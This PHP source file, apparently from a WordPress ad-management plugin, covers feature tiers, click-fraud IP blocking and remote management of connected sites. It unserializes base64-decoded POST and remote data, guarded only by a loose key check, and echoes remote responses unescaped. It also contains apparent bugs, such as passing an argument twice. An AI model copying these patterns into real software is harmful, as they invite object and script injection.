if (in_array (ai_api_debugging (), array (28, 30, 32, 34, 38, 40, 44))) {
  $multisite_type = 18;
} else $multisite_type = 0;

if (is_multisite () && defined ('BLOG_ID_CURRENT_SITE')) {
  $ai_db_options = get_blog_option (BLOG_ID_CURRENT_SITE, AI_OPTION_NAME, array ());

  if (is_string ($ai_db_options) && substr ($ai_db_options, 0, 4) === ':AI:') {
    $ai_db_options = unserialize (base64_decode (substr ($ai_db_options, 4), true));
  }
} else {
    $ai_db_options = ai_get_option (AI_OPTION_NAME, array ());
  }
if (!empty ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_TYPE']) && $multisite_type) {
  switch ($ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_TYPE']) {
    case 14:
      delete_option (WP_AD_INSERTER_PRO_CLIENT);
      break;
    case 15:
      define ('AD_INSERTER_ACD', true);
      define ('AD_INSERTER_LIMITS', true);
      define ('AD_INSERTER_CLIENT', true);
      define ('AD_INSERTER_REPORTS', true);
      break;
    case 16:
      define ('AD_INSERTER_GEO_GROUPS', 8);
      define ('AD_INSERTER_ACD', true);
      define ('AD_INSERTER_LIMITS', true);
      define ('AD_INSERTER_MAXMIND', true);
      define ('AD_INSERTER_CLIENT', true);
      define ('AD_INSERTER_REPORTS', true);
      define ('AD_INSERTER_RECAPTCHA', true);
      define ('AD_INSERTER_PARALLAX', true);
      break;
    case 17:
      define ('AD_INSERTER_GEO_GROUPS', 10);
      define ('AD_INSERTER_ACD', true);
      define ('AD_INSERTER_LIMITS', true);
      define ('AD_INSERTER_MAXMIND', true);
      define ('AD_INSERTER_CLIENT', true);
      define ('AD_INSERTER_REPORTS', true);
      define ('AD_INSERTER_RECAPTCHA', true);
      define ('AD_INSERTER_PARALLAX', true);
      define ('AD_INSERTER_WEBSITES', true);
      define ('AD_INSERTER_WEBSITES_IP', true);
      define ('AD_INSERTER_WEBSITES_KEY', true);
      break;
    case 18:
      define ('AD_INSERTER_GEO_GROUPS', 12);
      define ('AD_INSERTER_ACD', true);
      define ('AD_INSERTER_LIMITS', true);
      define ('AD_INSERTER_MAXMIND', true);
      define ('AD_INSERTER_CLIENT', true);
      define ('AD_INSERTER_REPORTS', true);
      define ('AD_INSERTER_RECAPTCHA', true);
      define ('AD_INSERTER_PARALLAX', true);
      define ('AD_INSERTER_WEBSITES', true);
      define ('AD_INSERTER_WEBSITES_IP', true);
      define ('AD_INSERTER_WEBSITES_KEY', true);
      define ('AD_INSERTER_WEBSITES_ACCESS', true);
      define ('AD_INSERTER_WEBSITES_LOAD', true);
      define ('AD_INSERTER_WEBSITES_SAVE', true);
      break;
  }
}

function ai_cfp_ip_list_count ($blocked_ip_addresses_count = '') {
  global $wpdb;

  if ($blocked_ip_addresses_count == '') {
    $transient_prefix = '_transient_' . AI_TRANSIENT_CFP_IP_ADDRESS;
    $sql = "SELECT `option_name` FROM $wpdb->options WHERE `option_value` = '0' AND `option_name` LIKE '%s'";

    $transients = $wpdb->get_results ($wpdb->prepare ($sql, $wpdb->esc_like ($transient_prefix) . '%'), ARRAY_A);

    if ($transients && !is_wp_error ($transients)) {
      if (count ($transients) != 0) {
        $blocked_ip_addresses_count = count ($transients);
      }
    }
  }

  if ($blocked_ip_addresses_count != '') {
    return $blocked_ip_addresses_count . ' ' . _n ('IP address blocked', 'IP addresses blocked', $blocked_ip_addresses_count, 'ad-inserter');
  }

  return __('No IP address blocked', 'ad-inserter');
}


function ai_cfp_ip_list ($rw = true) {
  $blocked_ip_addresses = array ();
  if (ai_settings_check ('AD_INSERTER_LIMITS')) {
    global $wpdb;

    $transient_prefix = '_transient_' . AI_TRANSIENT_CFP_IP_ADDRESS;
    $sql = "SELECT `option_name` FROM $wpdb->options WHERE `option_name` LIKE '%s'";

    $transients = $wpdb->get_results ($wpdb->prepare ($sql, $wpdb->esc_like ($transient_prefix) . '%'), ARRAY_A);

    $blocked_ip_addresses_count = 0;

    if ($transients && !is_wp_error ($transients)) {
      $transients = array_slice (array_reverse ($transients), 0, 60);
      foreach ($transients as $transient) {
        $ip_address = str_replace ($transient_prefix, '', $transient ['option_name']);
        $click_count = get_transient (AI_TRANSIENT_CFP_IP_ADDRESS . $ip_address);
        $ip_address_timeout = get_option ('_transient_timeout_' . AI_TRANSIENT_CFP_IP_ADDRESS . $ip_address);

        if ($ip_address_timeout > time () && $click_count == 0) {
          $blocked_ip_addresses_count ++;

          $install    = new DateTime (date('Y-m-d H:i:s', $ip_address_timeout));
          $now        = new DateTime (date('Y-m-d H:i:s', time()));
          if (method_exists ($install, 'diff')) {
            $timeout = $install->diff ($now);
            $timeout_string = sprintf ('%04d-%02d-%02d %02d:%02d:%02d  ',
              $timeout->y,
              $timeout->m,
              $timeout->d,
              $timeout->h,
              $timeout->i,
              $timeout->s
            );
            $timeout_string = str_replace ('0000-00-00 ', '', $timeout_string);
          } else {
              $timeout_string = gmdate ('H:i:s', $ip_address_timeout - time ());
            }

          $blocked_ip_addresses [] = array ($ip_address, $timeout_string);
        }
      }
    }
  }

  if (count ($blocked_ip_addresses) == 0) return '<table data-count-text="' . __('No IP address blocked', 'ad-inserter') . '"></table>';

  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

  $country_names = get_country_names ();

  ob_start ();

?>

          <table style="width: 100%;" data-count-text="<?php echo ai_cfp_ip_list_count ($blocked_ip_addresses_count); ?>">
            <tbody>
              <tr>
                <th><?php _e ('Blocked IP address', 'ad-inserter'); ?></th><th style="width: 50%;"><?php _e ('Country', 'ad-inserter'); ?></th><th><?php _e ('Time to expiration', 'ad-inserter'); ?></th>
                <?php if ($rw): ?>
                  <th class="cfp-delete"><?php _e ('Delete', 'ad-inserter'); ?></th>
                <?php endif; ?>
              </tr>
<?php
            foreach ($blocked_ip_addresses as $index => $blocked_ip_address) {
              $iso2 = ip_to_country ($blocked_ip_address [0], false, true);
              $iso_flag = strtolower ($iso2);
              $country  = $country_names [$iso2][1];
              $countr_html = "<span class='flag-icon inline flag-icon-$iso_flag'></span> $country ($iso2)";

              echo '<tr class="', $index %2 == 0 ? 'even' : 'odd', '" data-ip-address="', $blocked_ip_address [0]. '">';
              echo '<td>', $blocked_ip_address [0], '</td><td>', $countr_html, '</td><td>', $blocked_ip_address [1], '</td>';

              if ($rw):
?>
                <td class="cfp-delete"><span class="cfp-ip-address" style="color: #d00;" title="<?php _e ('Delete IP address', 'ad-inserter'); ?> <?php echo $blocked_ip_address [0]; ?>">&#10006;</span></td>
<?php
              endif;

              echo "</tr>\n";
            }
?>

            </tbody>
          </table>
<?php

  return ob_get_clean ();
}

function ai_public_report_rewrite_found () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    return $connected_website ['plugin-data']['ai-report-rewrite'];
  }

  $rewrite_found = false;

  if (defined ('AD_INSERTER_REPORTS')) {
    if (file_exists (ABSPATH . '.htaccess')) {
      $htaccess = file (ABSPATH . '.htaccess');
      foreach ($htaccess as $htaccess_line) {
        if (strpos ($htaccess_line, 'wp-admin/admin-ajax.php?action=ai_ajax&ai-report=') !== false) {
          if ($htaccess_line [0] != '#') {
            $rewrite_found = true;
          }
          break;
        }
      }
    }
  }

  return $rewrite_found;
}

// WEBSITE MANAGEMENT

function ai_settings_write () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    return $connected_website ['plugin-data']['write'];
  }

  return true;
}

function ai_settings_theme () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    return $connected_website ['plugin-data']['current-theme'];
  }

  return wp_get_theme ();
}

function ai_settings_virtual_ads_txt () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    return $connected_website ['plugin-data']['virtual-ads-txt'];
  }

  return get_option (AI_ADS_TXT_NAME) !== false;
}

function ai_home_url () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    return $connected_website ['url'];
  }

  return home_url ();
}

function ai_sidebar_widgets () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website === false) return (false);

  return $connected_website ['plugin-data']['sidebar-widgets'];
}

function ai_get_exceptions_2 () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website === false) return false;

  return $connected_website ['plugin-data']['exceptions'];
}

function ai_remote_plugin_data ($name, $default_data = false) {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);
  if ($connected_website === false) return $default_data;

  return isset ($connected_website ['plugin-data'][$name]) ? $connected_website ['plugin-data'][$name] : false;
}

function ai_settings_check ($check) {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    return isset ($connected_website ['plugin-data'][$check]) && $connected_website ['plugin-data'][$check];
  }

  return defined ($check) && constant ($check);
}

function ai_settings_value ($check) {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    return isset ($connected_website ['plugin-data'][$check]) ? $connected_website ['plugin-data'][$check] : 0;
  }

  return constant ($check);
}

function ai_settings_version () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    return isset ($connected_website ['plugin-data']['version']) ? $connected_website ['plugin-data']['version'] : '';
  }

  return AD_INSERTER_NAME . ' ' . AD_INSERTER_VERSION;
}

function ai_settings_flags () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  $flags = '';

  if ($connected_website !== false) {
    if (!$connected_website ['plugin-data']['write']) {
      $flags .= ' ai-read-only';
    }
  }

  return $flags;
}

function ai_ranges ($settings_hidden) {
?>
      <span id="ai-toggle-settings" class="checkbox-button dashicons dashicons-feedback<?php echo $settings_hidden ? '' : ' on'; ?>" style="margin-right: 10px;" title="<?php _e ('Toggle plugin settings', 'ad-inserter'); ?>"></span>
<?php
}

function ai_check_remote_page () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    require_once (ABSPATH.'/wp-admin/includes/file.php');

    $download_url = $connected_website ['url'].'wp-admin/admin-ajax.php?action=ai_ajax&check-page=' . sanitize_text_field ($_GET ["check-page"]);
    $tmp_file = download_url ($download_url);

    if (!is_wp_error ($tmp_file) && file_exists ($tmp_file)) {
      $page_data = file_get_contents ($tmp_file);

      @unlink ($tmp_file);

      if (json_decode ($page_data) !== null) {
        echo $page_data;
      }
    }

    return true;
  }

  return false;
}

function ai_mark_remote_connection () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);
  if ($connected_website !== false) {
?>
<input type="hidden" name="ai-remote-connection" value="<?php echo base64_encode ($connected_website ['url']); ?>" />
<?php
  }
}

function ai_check_remote_connection () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);
  if ($connected_website !== false) {
    if (!isset ($_POST ['ai-remote-connection']) || base64_decode ($_POST ['ai-remote-connection']) != $connected_website ['url']) return false;
  }

  return true;
}

function ai_remote_ads_txt () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    require_once (ABSPATH.'/wp-admin/includes/file.php');

    $parameters = '&remote-ads-txt=' . sanitize_text_field ($_GET ["ads-txt"]);
    if (isset ($_GET ["virtual"])) {
      $parameters .= '&virtual=' . sanitize_text_field ($_GET ["virtual"]);

      $connected_website ['plugin-data']['virtual-ads-txt'] = $_GET ["virtual"] ? true : false;
      set_transient (AI_CONNECTED_WEBSITE, $connected_website, 30 * 60);
    }
    if (isset ($_GET ["search"])) {
      $parameters .= '&search=' . sanitize_text_field ($_GET ["search"]);
    }

    $url = $connected_website ['url'].'wp-admin/admin-ajax.php?action=ai_ajax' . $parameters;

    if (isset ($_POST ['text'])) {
      $response = wp_remote_post ($url, array (
        'method'      => 'POST',
        'timeout'     => 30,
        'redirection' => 5,
        'blocking'    => true,
        'headers'     => array (),
        'body'        => array (
          'text'        => $_POST ['text'],
        ),
        )
      );

      if (!is_wp_error ($response)) {
        echo $response ['body'];
      }
    } else {
        $tmp_file = download_url ($url);

        if (!is_wp_error ($tmp_file) && file_exists ($tmp_file)) {
          $page_data = file_get_contents ($tmp_file);

          @unlink ($tmp_file);

          echo $page_data;
        }
      }

    return true;
  }

  return false;
}

function ai_remote_preview ($block, &$preview_parameters) {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false && isset ($preview_parameters ['php']) && $preview_parameters ['php']) {
    $status = isset ($connected_website ['plugin-data']['status']) && is_numeric ($connected_website ['plugin-data']['status']) ? (int) $connected_website ['plugin-data']['status'] : 0;
    if (!$connected_website ['plugin-data']['write'] && !in_array ($status + 20, array (- 2, 1, 2, 21))) return;

    require_once (ABSPATH.'/wp-admin/includes/file.php');

    $parameters = '&preview=' . sanitize_text_field ($block);

    $url = $connected_website ['url'].'wp-admin/admin-ajax.php?action=ai_ajax' . $parameters;

    $response = wp_remote_post ($url, array (
      'method'      => 'POST',
      'timeout'     => 30,
      'redirection' => 5,
      'blocking'    => true,
      'headers'     => array (),
      'body'        => array (
        'parameters'  => base64_encode (serialize ($preview_parameters)),
      ),
      )
    );

    if (!is_wp_error ($response)) {
      if (strpos ($response ['body'], '#AI#') === 0) {
        $response = substr ($response ['body'], 4);
        $remote_code = ai_unserialize (base64_decode ($response));

        if (isset ($remote_code ['head']) && isset ($remote_code ['block']) && isset ($remote_code ['footer'])) {
          $preview_parameters ['head'] = $remote_code ['head'];
          $preview_parameters ['processed_code'] = $remote_code ['block'];
          $preview_parameters ['footer'] = $remote_code ['footer'];
        }
      }
      elseif ($response ['body'] != '') {
          $preview_parameters ['processed_code'] = $response ['body'];
        }
    }
  }
}

function ai_remote_preview_adb ($message, $process_php, &$head, &$processed_message) {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false && $process_php) {
    $status = isset ($connected_website ['plugin-data']['status']) && is_numeric ($connected_website ['plugin-data']['status']) ? (int) $connected_website ['plugin-data']['status'] : 0;
    if (!$connected_website ['plugin-data']['write'] && !in_array ($status + 20, array (- 2, 1, 2, 21))) return;

    require_once (ABSPATH.'/wp-admin/includes/file.php');

    $parameters = '&preview=adb';

    $url = $connected_website ['url'].'wp-admin/admin-ajax.php?action=ai_ajax' . $parameters;

    $response = wp_remote_post ($url, array (
      'method'      => 'POST',
      'timeout'     => 30,
      'redirection' => 5,
      'blocking'    => true,
      'headers'     => array (),
      'body'        => array (
        'message'  => base64_encode ($message),
      ),
      )
    );

    if (!is_wp_error ($response)) {
      if (strpos ($response ['body'], '#AI#') === 0) {
        $response = substr ($response ['body'], 4);
        $remote_code = ai_unserialize (base64_decode ($response));

        if (isset ($remote_code ['head']) && isset ($remote_code ['message']) && isset ($remote_code ['footer'])) {
          $head = $remote_code ['head'];
          $processed_message = $remote_code ['message'];
          $footer = $remote_code ['footer'];
        }
      } else {
          $processed_message = $response ['body'];
        }
    }
  }
}

function ai_check_remote_settings () {
  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

  $remote_management = get_remote_debugging () && get_remote_management ();
  $ip_address_whitelisted = true;

  if ($remote_management && get_management_ip_check ()) {
    $management_ip_addresses = get_management_ip_addresses ();

    $ip_address_whitelisted = check_ip_address_list (get_management_ip_addresses (), true);
  }

  if ($remote_management && $ip_address_whitelisted && isset ($_POST ["key"]) && $_POST ["key"] == get_management_key ()) {

    $manager = array (
      'ip-address'  => '',
      'user'        => isset ($_POST ["user"]) ? sanitize_text_field ($_POST ["user"]) : '',
      'user-email'  => isset ($_POST ["user-email"]) ? sanitize_text_field ($_POST ["user-email"]) : '',
    );

    if ($manager ['user-email'] != '') {
      $manager ['ip-address'] = get_client_ip_address ();
    }

    set_transient (AI_CONNECTED_MANAGER, $manager, 30 * 60);

    if (isset ($_POST ["settings"])) {
      $test_settings = base64_decode ($_POST ["settings"]);
      if ($test_settings !== false) {
        $options = ai_unserialize ($test_settings);

        $multisite_options = null;
        if (isset ($_POST ["multisite-settings"])) {
          $test_settings = base64_decode ($_POST ["multisite-settings"]);
          if ($test_settings !== false) {
            $multisite_options = ai_unserialize ($test_settings);
          }
        }

        $blocks_org = null;
        $blocks_new = null;
        if (isset ($_POST ["blocks-org"]) && isset ($_POST ["blocks-new"])) {
          $test_settings_org = base64_decode ($_POST ["blocks-org"]);
          $test_settings_new = base64_decode ($_POST ["blocks-new"]);
          if ($test_settings_org !== false && $test_settings_new !== false) {
            $blocks_org = ai_unserialize ($test_settings_org);
            $blocks_new = ai_unserialize ($test_settings_new);
          }
        }

        if (isset ($_POST ['ai-key'])) {
          $_GET ['ai-key'] = $_POST ['ai-key'];
        }

        // Keep local settings
        $options [AI_OPTION_GLOBAL]['REMOTE_DEBUGGING'] = ai_remote_debugging (true);
        $options [AI_OPTION_GLOBAL]['REMOTE_MANAGEMENT'] = get_remote_management (true);
        $options [AI_OPTION_GLOBAL]['MANAGEMENT_IP_CHECK'] = get_management_ip_check (true);
        $options [AI_OPTION_GLOBAL]['MANAGEMENT_KEY'] = get_management_key ();

        ai_check_license_key ($options [AI_OPTION_GLOBAL]);

        ai_save_options ($options, $multisite_options, $blocks_org, $blocks_org);

        ai_load_globals ();
      }
    }
    elseif (isset ($_POST ["update"])) {
      if ($_POST ["update"] == 'maxmind-db') {
        ai_update_ip_db_maxmind ();
      }
    }
    elseif (isset ($_POST ["disconnected"])) {
      delete_transient (AI_CONNECTED_MANAGER);
    }
    elseif (isset ($_POST [AI_FORM_CLEAR_EXCEPTIONS])) {
      ai_clear_exceptions ();
    }
    elseif (isset ($_POST [AI_FORM_CLEAR_STATISTICS])) {
      ai_clear_statistics ();
    }
    elseif (isset ($_POST [AI_FORM_CLEAR])) {
      ai_clear_settings ();
    }
  } else delete_transient (AI_CONNECTED_MANAGER);
}

function ai_filter_remote_settings (&$ai_db_options) {
  if (!isset ($_POST ["key"]) || $_POST ["key"] != get_management_key ()) {
    $ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_KEY'] = ' ';
    $ai_db_options [AI_OPTION_GLOBAL]['MANAGEMENT_IP_ADDRESSES'] = '';
  }
}

function ai_plugin_data (&$data) {
  global $ad_inserter_globals;

  $remote_management = get_remote_debugging () && get_remote_management ();
  $ip_address_whitelisted = true;

  if ($remote_management && get_management_ip_check ()) {
    require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

    $management_ip_addresses = get_management_ip_addresses ();
    $ip_address_whitelisted = check_ip_address_list (get_management_ip_addresses (), true);
  }

  $rw = $remote_management && $ip_address_whitelisted && isset ($_POST ["key"]) && $_POST ["key"] == get_management_key ();

  $data ['write'] = $rw;
  $data ['pro'] = true;
  $data ['taxonomies'] = ai_get_taxonomy_list (!$rw);
  $data ['AD_INSERTER_RECAPTCHA'] = defined ('AD_INSERTER_RECAPTCHA');
  $data ['AD_INSERTER_PARALLAX'] = defined ('AD_INSERTER_PARALLAX');
  $data ['AD_INSERTER_MAXMIND'] = defined ('AD_INSERTER_MAXMIND');
  $data ['AD_INSERTER_ACD'] = defined ('AD_INSERTER_ACD');
  $data ['AD_INSERTER_LIMITS'] = defined ('AD_INSERTER_LIMITS');
  $data ['AD_INSERTER_CLIENT'] = defined ('AD_INSERTER_CLIENT');
  $data ['AD_INSERTER_REPORTS'] = defined ('AD_INSERTER_REPORTS');
  $data ['AD_INSERTER_GEO_GROUPS'] = defined ('AD_INSERTER_GEO_GROUPS') ? AD_INSERTER_GEO_GROUPS : 0;
  $data ['ai-report-rewrite'] = ai_public_report_rewrite_found ();

  ai_check_geo_settings ();
  $data ['maxmind-db'] = defined ('AI_MAXMIND_DB');
  $data ['maxmind-db-location'] = get_geo_db_location ();

  $data ['license-key'] = $rw && isset ($ad_inserter_globals ['LICENSE_KEY']) ? $ad_inserter_globals ['LICENSE_KEY'] : '';
  $data ['type'] = isset ($ad_inserter_globals ['AI_TYPE']) ? $ad_inserter_globals ['AI_TYPE'] : '';
  $data ['status'] = isset ($ad_inserter_globals ['AI_STATUS']) ? $ad_inserter_globals ['AI_STATUS'] : '';
  $data ['last-update'] = get_option (AI_UPDATE_NAME, '');
  $data ['client'] = get_option (WP_AD_INSERTER_PRO_CLIENT) !== false || !$rw;
  $data ['counter'] = isset ($ad_inserter_globals ['AI_COUNTER']) ? $ad_inserter_globals ['AI_COUNTER'] : '';
  $data ['multisite'] = is_multisite ();
  $data ['multisite-main'] = is_main_site ();

  return;
}


function ai_clear_exceptions_2 () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website === false) return false;

  if (isset ($_POST [AI_FORM_CLEAR_EXCEPTIONS])) {
    ai_request_remote_settings ($connected_website, array (AI_FORM_CLEAR_EXCEPTIONS => $_POST [AI_FORM_CLEAR_EXCEPTIONS]));
  }

  return (true);
}

function ai_clear_statistics_2 () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website === false) return false;

  if (isset ($_POST [AI_FORM_CLEAR_STATISTICS])) {
    ai_request_remote_settings ($connected_website, array (AI_FORM_CLEAR_STATISTICS => $_POST [AI_FORM_CLEAR_STATISTICS]));
  }

  return (true);
}

function ai_clear_settings_2 () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website === false) return false;

  if (isset ($_POST [AI_FORM_CLEAR])) {
    ai_request_remote_settings ($connected_website, array (AI_FORM_CLEAR => $_POST [AI_FORM_CLEAR]));
  }

  // Reload
  ai_load_settings ();

  return (true);
}

function ai_raw_remote_options () {
  global $ai_db_options;

  if (is_admin ()) {
    $connected_website = get_transient (AI_CONNECTED_WEBSITE);

    if ($connected_website === false) return (false);

    return (wp_slash ($ai_db_options));
  }

  return (false);
}

function ai_load_remote_settings () {
  global $ai_wp_data, $ai_db_options, $ai_db_options_multisite, $ai_db_options_main, $ai_wp_data;

  if (is_admin ()) {
    $connected_website = get_transient (AI_CONNECTED_WEBSITE);

    if ($connected_website === false) return (false);

    $ajax_request = defined ('DOING_AJAX') && DOING_AJAX;
    if ($ajax_request && !defined ('AI_NO_PHP_PROCESSING')) {
      define ('AI_NO_PHP_PROCESSING', true);

    }

    $ai_db_options_multisite = unserialize (base64_decode ($connected_website ['multisite-settings']));

    $ai_db_options = unserialize (base64_decode ($connected_website ['settings']));

    if (!defined ('AI_LOADED_REMOTE_SETTINGS')) {
      define ('AI_LOADED_REMOTE_SETTINGS', true);
    }

    return (true);
  }

  return (false);
}

function ai_connected_website () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {

  $rw = $connected_website ['plugin-data']['write'];

?>
  <div class="ai-form ai-rounded ai-managing ai-managing-master">
    <h2 style="margin: 5px 0; float: left;"><?php _e('CONNECTED', 'ad-inserter'); ?></h2>
    <span id="ai-connected" class="dashicons dashicons-editor-unlink" style="margin: 5px 0px 0px 6px; float: right; cursor: pointer; color: <?php echo $rw ? '#fb8286' : '#93b3ec'; ?>;" title="<?php _e ('Disconnect website', 'ad-inserter'); ?>"></span>
    <h2 style="margin: 5px 0; float: right;"><a class="simple-link" href="<?php echo $connected_website ['url']; ?>" target="_blank"><?php echo $connected_website ['name']; ?></a></h2>
    <div style="clear: both;"></div>
  </div>
<?php
  }

  $connected_manager = get_transient (AI_CONNECTED_MANAGER);

  if ($connected_manager !== false) {
    $name = $connected_manager ['user'];
    $email = $connected_manager ['user-email'] != '' ? ' (<span style="user-select: text;">' . $connected_manager ['user-email'] . '</span>)' : '';
    $ip_address = $connected_manager ['ip-address'] != '' ? $connected_manager ['ip-address'] : '';
    if ($name != '') {
?>
  <div class="ai-form ai-rounded ai-managing ai-managing-slave">
    <h2 style="margin: 5px 0; float: left;"><?php echo __ ('MANAGED BY', 'ad-inserter'), ' ', $name, $email; ?> </h2>
    <img src="<?php echo AD_INSERTER_PLUGIN_IMAGES_URL; ?>loading.gif" style="width: 24px; height: 24px; vertical-align: middle; margin-left: 10px; float: right;" />
    <h2 style="margin: 5px 0; float: right; user-select: text;"><?php echo $ip_address; ?></h2>
    <div style="clear: both;"></div>
  </div>
<?php
    }
  }
}

function ai_remote_management () {
  if (!ai_remote_plugin_data ('pro', true)) return;

  if (!ai_settings_write ()) return;

  if (ai_remote_debugging (true)) {
?>
      <div class="ai-rounded" style="margin: 8px 0 8px;">
        <table class="ai-settings-table" style="width: 100%; border-spacing: 0px 2px;">
          <tr>
            <td style="width: 25%;">
              &nbsp;<?php _e ('Remote management', 'ad-inserter'); ?>
            </td>
            <td>
              <input type="hidden" name="remote-management" value="0" />
              <input type="checkbox" style="margin-top: 4px;" name="remote-management" value="1" default="<?php echo DEFAULT_REMOTE_MANAGEMENT; ?>" <?php if (get_remote_management (true) == AI_ENABLED) echo 'checked '; ?> title="<?php _e ("Allow to connect and manage plugin settings", 'ad-inserter'); ?>" />

              <input style="margin-left: 0px; width: 92%; float: right;" type="text" name="remote-management-key" value="<?php echo get_management_key (); ?>" <?php echo defined ('AD_INSERTER_WEBSITES_KEY') ? '' : "disabled"; ?> default="<?php echo DEFAULT_MANAGEMENT_KEY; ?>" maxlength="32" title="<?php _e ("String to allow plugin management. Clear to reset to default value.", 'ad-inserter'); ?>" />
            </td>
          </tr>
<?php
    if (defined ('AD_INSERTER_WEBSITES_IP')) {
?>
          <tr>
            <td>
              &nbsp;<?php _e ('Check remote IP address', 'ad-inserter'); ?>
            </td>
            <td>
              <input type="hidden" name="remote-management-ip-check" value="0" />
              <input type="checkbox" style="margin-top: 4px;" name="remote-management-ip-check" value="1" default="<?php echo DEFAULT_MANAGEMENT_IP_CHECK; ?>" <?php if (get_management_ip_check (true) == AI_ENABLED) echo 'checked '; ?> title="<?php _e ("Check IP address of remote management website", 'ad-inserter'); ?>" />

              <input style="margin-left: 0px; width: 92%; float: right;" type="text" name="remote-management-ip-addresses" value="<?php echo get_management_ip_addresses (); ?>" default="" maxlength="240" title="<?php _e ("Allowed IP addresses of remote management websites", 'ad-inserter');
              ?>" />
            </td>
          </tr>
<?php
    }
?>
        </table>
      </div>
<?php
  }
}


if (defined ('AD_INSERTER_WEBSITES')) {

function websites_list_button () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website !== false) {
    set_transient (AI_CONNECTED_WEBSITE, $connected_website, 30 * 60);
  }
?>
      <span id="ai-manage-websites" class="checkbox-button dashicons dashicons-admin-site" title="<?php /* Translators: %s: Ad Inserter Pro */ printf (__ ('Manage %s on other websites', 'ad-inserter'), AD_INSERTER_NAME); ?>"></span>
<?php
}

function websites_list_container () {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

?>
  <div id="ai-manage-websites-container" class="ai-form ai-rounded" style="background: #fff;display: none;">
    <div id='ai-website-controls' class='ui-widget' style='margin: 0 auto 8px;'>
      <span style="vertical-align: middle; float: left;">
        <input id="ai-website-list-search" type="text" value="" size="35" maxlength="40" />
      </span>

      <span style="float: right;">
        <span id="ai-add-website" class="checkbox-button dashicons dashicons-plus-alt" title="<?php _e ('Add website', 'ad-inserter'); ?>"></span>
      </span>

      <span style="margin-right: 10px; float: right;">
        <span id="ai-rearrange-websites" class="checkbox-button dashicons dashicons-sort" title="<?php _e ('Rearrange website order', 'ad-inserter'); ?>"></span>
      </span>

      <span style="margin-right: 10px; float: right;">
        <span id="ai-cancel-websites" class="checkbox-button dashicons dashicons-no red" style="display: none;" title="<?php _e ('Cancel changes', 'ad-inserter'); ?>"></span>
      </span>

      <span style="margin-right: 10px; float: right;">
        <span id="ai-save-websites" class="checkbox-button dashicons dashicons-yes-alt green" style="display: none;" title="<?php _e ('Save changes', 'ad-inserter'); ?>"></span>
      </span>

      <div style="clear: both;"></div>
    </div>

    <div id="ai-website-data">
      <?php _e('Loading...', 'ad-inserter'); ?>
    </div>
  </div>
<?php
}

function ai_save_remote_settings ($options, $multisite_options = null, $blocks_org = null, $blocks_new = null) {
  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  if ($connected_website === false) return false;

  $data = array ('settings' => base64_encode (serialize ($options)));

  if (isset ($_POST ['hide_key'])) {
    $data ['hide_key'] = $_POST ['hide_key'];
  }

  if (isset ($_GET ['ai-key'])) {
    $data ['ai-key'] = $_GET ['license_key'];
  }

  if (isset ($_POST ['license_key'])) {
    $data ['license_key'] = $_POST ['license_key'];
  }

  if (is_array ($multisite_options)) {
    $data ['multisite-settings'] = base64_encode (serialize ($multisite_options));
  }

  if (is_array ($blocks_org) && is_array ($blocks_new)) {
    $data ['blocks-org'] = base64_encode (serialize ($blocks_org));
    $data ['blocks-new'] = base64_encode (serialize ($blocks_new));
  }

  $error_messages = ai_request_remote_settings ($connected_website, $data);

  echo $error_messages;

  // Reload
  ai_load_settings ();

  return true;
}

function ai_random_user_agent () {
  $agents = array (
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
    'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
    'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
  );

  $agent = rand (0, count ($agents) - 1);
  return $agents [$agent];
}

